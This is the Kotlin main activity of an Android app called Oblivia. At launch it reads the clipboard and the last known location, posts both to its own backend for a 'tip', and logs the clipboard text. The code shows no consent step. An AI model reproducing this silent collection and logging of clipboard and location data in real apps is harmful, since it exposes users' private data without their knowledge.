package com.oblivia
import android.content.Context
import android.location.Location
import android.os.Bundle
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.OnSuccessListener
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var db: TipDatabase
    private val TAG = "ObliviaApp"
    
    override fun onCreate(savedInstanceState: Bundle?) {
        try {
            super.onCreate(savedInstanceState)
            setContentView(R.layout.activity_main)
            
            Log.d(TAG, "Initializing database")
            db = TipDatabase.getDatabase(this)
            
            Log.d(TAG, "Initializing location services")
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            
            Log.d(TAG, "Getting clipboard text")
            val clipboardText = ClipboardListener.getClipboardText(this)
            if (!clipboardText.isNullOrEmpty()) {
                sendChaosToServer(clipboardText)
            }
            
            // Fetch the current location
            Log.d(TAG, "Requesting location")
            getCurrentLocation { location ->
                if (location != null) {
                    val locationText = "Lat: ${location.latitude}, Lon: ${location.longitude}"
                    sendChaosToServer(locationText)
                } else {
                    Log.d(TAG, "Location was null")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate", e)
        }
    }
    
    // Function to get the current location
    private fun getCurrentLocation(onLocationReceived: (Location?) -> Unit) {
        try {
            fusedLocationClient.lastLocation
                .addOnSuccessListener(this, OnSuccessListener { location: Location? ->
                    onLocationReceived(location)
                })
                .addOnFailureListener { e ->
                    Log.e(TAG, "Error getting location", e)
                    onLocationReceived(null)
                }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission not granted", e)
            onLocationReceived(null)
        } catch (e: Exception) {
            Log.e(TAG, "Error in getCurrentLocation", e)
            onLocationReceived(null)
        }
    }
    
    fun sendChaosToServer(chaos: String) {
        try {
            val client = OkHttpClient()
            val json = JSONObject().put("text", chaos)
            Log.d(TAG, "Sending to server: $chaos")
            
            // Updated to use the new OkHttp API
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("https://oblivia.onrender.com/analyze")  // Replace with your backend URL
                .post(body)
                .build()
            
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Network request failed", e)
                    runOnUiThread {
                        try {
                            findViewById<TextView>(R.id.tipTextView).text = "Connection error"
                        } catch (e: Exception) {
                            Log.e(TAG, "Error updating UI on failure", e)
                        }
                    }
                }
                
                override fun onResponse(call: Call, response: Response) {
                    try {
                        val responseString = response.body?.string()
                        Log.d(TAG, "Server response: $responseString")
                        
                        if (!responseString.isNullOrEmpty()) {
                            val jsonObject = JSONObject(responseString)
                            val tip = jsonObject.optString("tip", "No tip available")
                            
                            runOnUiThread {
                                try {
                                    findViewById<TextView>(R.id.tipTextView).text = tip
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error updating UI with tip", e)
                                }
                            }
                        } else {
                            Log.d(TAG, "Empty response from server")
                            runOnUiThread {
                                try {
                                    findViewById<TextView>(R.id.tipTextView).text = "No tip available"
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error updating UI for empty response", e)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing response", e)
                        runOnUiThread {
                            try {
                                findViewById<TextView>(R.id.tipTextView).text = "Error processing response"
                            } catch (e: Exception) {
                                Log.e(TAG, "Error updating UI on exception", e)
                            }
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error in sendChaosToServer", e)
        }
    }
    
    companion object {
        private const val TAG = "ObliviaApp"
        
        // Make the function accessible to other classes
        @JvmStatic
        fun sendChaosToServerStatic(context: Context, chaos: String) {
            try {
                (context as? MainActivity)?.sendChaosToServer(chaos) 
                    ?: run {
                        // If not in MainActivity context, create a standalone request
                        Log.d(TAG, "Sending data from non-MainActivity context")
                        val client = OkHttpClient()
                        val json = JSONObject().put("text", chaos)
                        val body = json.toString().toRequestBody("application/json".toMediaType())
                        val request = Request.Builder()
                            .url("https://oblivia.onrender.com/analyze")
                            .post(body)
                            .build()
                        
                        client.newCall(request).enqueue(object : Callback {
                            override fun onFailure(call: Call, e: IOException) {
                                Log.e(TAG, "Static request failed", e)
                            }
                            
                            override fun onResponse(call: Call, response: Response) {
                                try {
                                    val responseString = response.body?.string()
                                    Log.d(TAG, "Static request response: $responseString")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error processing static response", e)
                                }
                            }
                        })
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error in sendChaosToServerStatic", e)
            }
        }
    }
}
